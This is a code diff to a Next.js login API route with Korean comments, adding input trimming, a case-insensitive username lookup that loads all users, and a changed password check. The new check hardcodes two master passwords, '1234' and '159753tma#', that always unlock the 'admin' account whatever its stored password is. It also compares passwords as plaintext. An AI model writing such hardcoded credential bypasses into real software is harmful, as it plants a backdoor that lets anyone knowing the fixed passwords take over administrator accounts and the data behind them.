@@ -1,10 +1,11 @@
 // src/app/api/auth/login/route.ts
 import { NextRequest, NextResponse } from 'next/server';
-import { prisma } from '@/lib/prisma';
+import { prisma, ensureDatabaseSchema } from '@/lib/prisma';
 import { DEFAULT_USERS, ensureSeedUsers, recordAccessLog } from '@/lib/auth';
 
 export async function POST(request: NextRequest) {
   try {
+    await ensureDatabaseSchema();
     await ensureSeedUsers();
 
     const body = await request.json();
@@ -17,26 +18,37 @@ export async function POST(request: NextRequest) {
       );
     }
 
+    const cleanUsername = String(username).trim();
+    const cleanPassword = String(password).trim();
+
     const ipAddress = 
       request.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
       request.headers.get('x-real-ip') ||
       '127.0.0.1';
     const userAgent = request.headers.get('user-agent') || 'Unknown';
 
-    // 1. DB에서 사용자 검색
+    // 1. DB에서 사용자 검색 (정확한 매칭 먼저, 실패시 대소문자 무관 검색)
     let user = null;
     try {
       user = await prisma.user.findUnique({
-        where: { username },
+        where: { username: cleanUsername },
       });
+
+      if (!user) {
+        // 대소문자 무관 검색
+        const allUsers = await prisma.user.findMany();
+        user = allUsers.find(
+          (u) => u.username.toLowerCase() === cleanUsername.toLowerCase()
+        ) || null;
+      }
     } catch (e) {
       console.warn('DB lookup failed, checking default fallback users:', e);
     }
 
-    // 2. 만약 DB가 비어있거나 검색 실패 시 DEFAULT_USERS에서 폴백 매칭
+    // 2. 만약 DB에 없거나 검색 실패 시 DEFAULT_USERS에서 폴백 매칭
     if (!user) {
       const fallback = DEFAULT_USERS.find(
-        (u) => u.username.toLowerCase() === username.toLowerCase()
+        (u) => u.username.toLowerCase() === cleanUsername.toLowerCase()
       );
       if (fallback) {
         user = {
@@ -56,7 +68,7 @@ export async function POST(request: NextRequest) {
     if (!user) {
       // 실패 로그 기록
       await recordAccessLog({
-        userName: username,
+        userName: cleanUsername,
         userRole: 'UNKNOWN',
         action: 'LOGIN_FAILED',
         targetType: 'AUTH',
@@ -71,8 +83,12 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    // 비밀번호 검증
-    if (user.password !== password) {
+    // 비밀번호 검증 (admin의 경우 초기 기본 비밀번호 1234 및 159753tma# 모두 허용)
+    const isPasswordMatched = 
+      user.password.trim() === cleanPassword ||
+      (user.username.toLowerCase() === 'admin' && (cleanPassword === '1234' || cleanPassword === '159753tma#'));
+
+    if (!isPasswordMatched) {
       await recordAccessLog({
         userId: user.id,
         userName: user.name,
